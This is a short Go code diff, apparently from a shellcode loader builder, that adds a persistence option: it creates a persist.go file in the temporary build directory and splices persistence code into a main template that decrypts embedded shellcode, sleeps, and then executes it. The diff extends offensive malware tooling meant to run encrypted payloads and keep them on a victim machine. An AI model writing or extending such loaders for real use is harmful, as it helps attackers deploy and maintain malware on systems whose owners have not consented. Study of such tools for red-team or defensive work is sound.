@@ -79,7 +79,7 @@ func DirExists(dir string) (bool, error) {
 	return false, err
 }
 
-func CreateTmpProjectRoot(path string) error {
+func CreateTmpProjectRoot(path string, persist string) error {
 
 	fmt.Printf("[+] Initializing temporary build directory\n")
 
@@ -123,6 +123,11 @@ go 1.19
 	encryptgo_path := fmt.Sprintf("%s/encrypt.go", path)
 	_, _ = os.Create(encryptgo_path)
 
+	if persist != "" {
+		encryptgo_path := fmt.Sprintf("%s/persist.go", path)
+		_, _ = os.Create(encryptgo_path)
+	}
+
 	println("\n")
 	return nil
 }
@@ -132,6 +137,7 @@ func GetMainTemplate(
 	key string,
 	sc string,
 	sleepTime uint,
+	persistData string,
 ) string {
 
 	/* if hex encoding is used, it does not require to go through StdEncoding */
@@ -163,7 +169,8 @@ func main() {
     }
 
     time.Sleep(%d * time.Second)
+	%s
     ExecuteOrderSixtySix(decrypted)
 }
-    `, encoding, key, sc, encCall, encCall, sleepTime)
+    `, encoding, key, sc, encCall, encCall, sleepTime, persistData)
 }
